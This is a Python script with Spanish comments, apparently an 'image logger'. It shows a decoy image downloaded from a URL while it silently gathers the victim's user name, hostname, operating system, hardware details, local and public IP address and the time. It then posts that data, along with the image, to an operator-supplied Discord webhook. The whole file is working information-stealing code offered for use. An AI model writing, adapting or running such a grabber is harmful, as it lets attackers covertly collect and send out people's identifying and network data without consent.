import os
import platform
import socket
import requests
import psutil
import getpass
import datetime
import tempfile
import urllib.request
from PIL import Image
import io
import subprocess

# ========== CONFIGURACIÓN ==========
WEBHOOK_URL = input('Introduce la URL del webhook de Discord: ')
IMAGEN_URL = input('Introduce la URL de la imagen a mostrar: ')

# ========== FUNCIONES DE INFO ==========
def get_ip_publica():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return 'No disponible'

def get_ip_local():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return 'No disponible'

def get_system_info():
    info = {}
    info['Usuario'] = getpass.getuser()
    info['Sistema'] = platform.system()
    info['Version SO'] = platform.version()
    info['Nombre equipo'] = platform.node()
    info['Procesador'] = platform.processor()
    info['RAM (GB)'] = round(psutil.virtual_memory().total / (1024**3), 2)
    info['IP Local'] = get_ip_local()
    info['IP Pública'] = get_ip_publica()
    info['Fecha y hora'] = str(datetime.datetime.now())
    return info

# ========== ENVIAR A DISCORD ==========
def send_to_discord(info_dict, image_path=None):
    content = '\n'.join([f'**{k}:** {v}' for k, v in info_dict.items()])
    data = {'content': content}
    files = {}
    if image_path:
        files['file'] = open(image_path, 'rb')
    requests.post(WEBHOOK_URL, data=data, files=files if files else None)
    if files:
        files['file'].close()

# ========== DESCARGAR Y MOSTRAR IMAGEN ==========
def mostrar_imagen(url):
    try:
        response = urllib.request.urlopen(url)
        img_data = response.read()
        img = Image.open(io.BytesIO(img_data))
        # Guardar temporalmente como .png
        temp_path = os.path.join(tempfile.gettempdir(), 'imagen_logger.png')
        img.save(temp_path, 'PNG')
        img.show()
        return temp_path
    except Exception as e:
        print(f'Error mostrando imagen: {e}')
        return None

# ========== MAIN ==========
def main():
    info = get_system_info()
    img_path = mostrar_imagen(IMAGEN_URL)
    send_to_discord(info, img_path)

if __name__ == '__main__':
    main() 